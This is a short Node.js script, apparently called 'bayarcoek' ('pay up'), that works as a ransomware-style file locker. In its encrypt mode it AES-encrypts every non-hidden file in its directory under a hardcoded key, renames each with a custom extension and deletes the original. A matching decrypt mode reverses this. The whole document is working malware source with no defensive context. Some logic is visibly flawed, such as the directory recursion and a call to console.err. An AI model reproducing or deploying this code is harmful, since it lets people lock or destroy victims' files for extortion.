const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const algorithm = 'aes-256-ctr';
let key = 'N7wKWb5434FLD';
key = crypto
  .createHash('sha256')
  .update(String(key))
  .digest('base64')
  .substr(0, 32);

const mode = process.argv[2];
if (!['encrypt', 'decrypt'].includes(mode)) {
  console.log(`${mode} apaan bro? Gk paham sy`);
  process.exit(1);
}
const extension = process.argv[3] || 'bayarcoek';
let count = 0;
const _path = __dirname + '/';

const encrypt = (buffer) => {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(algorithm, key, iv);
  const result = Buffer.concat([iv, cipher.update(buffer), cipher.final()]);
  return result;
};

const decrypt = (encrypted) => {
  // Get the iv: the first 16 bytes
  const iv = encrypted.slice(0, 16);
  // Get the rest
  encrypted = encrypted.slice(16);
  // Create a decipher
  const decipher = crypto.createDecipheriv(algorithm, key, iv);
  // Actually decrypt it
  const result = Buffer.concat([decipher.update(encrypted), decipher.final()]);
  return result;
};

const main = (dir) => {
  let files = fs.readdirSync(dir);
  files = files.filter(
    // (file) => !/(^|\/)\.[^\/\.]/g.test(file) && file != 'bayarcoek.js'
    (file) => !/(^|\/)\.[^]/g.test(file) && file != 'bayarcoek.js'
  );
  files.forEach((file) => {
    let oldPath, newPath;
    if (mode == 'encrypt') {
      oldPath = `${dir}/${file}`;
      newPath = `${oldPath}.${extension}`;
    } else if (mode == 'decrypt') {
      oldPath = `${dir}/${file}`;
      newPath =
        path.parse(`${oldPath}`).dir + '/' + path.parse(`${oldPath}`).name;
    }
    const item = fs.statSync(oldPath);

    const plain = Buffer.from(fs.readFileSync(oldPath));
    let result;
    if (mode == 'encrypt') result = encrypt(plain);
    else if (mode == 'decrypt') result = decrypt(plain);
    fs.writeFile(newPath, result, (err) => {
      if (err) return console.err(err);
      fs.unlink(oldPath, () => {
        console.log(
          `${++count}. ${oldPath.replace(_path, '')} => ${newPath.replace(
            _path,
            ''
          )} (SUCCESS)`
        );
      });
      if (item.isDirectory()) main(newPath);
    });
  });
};

main(__dirname);
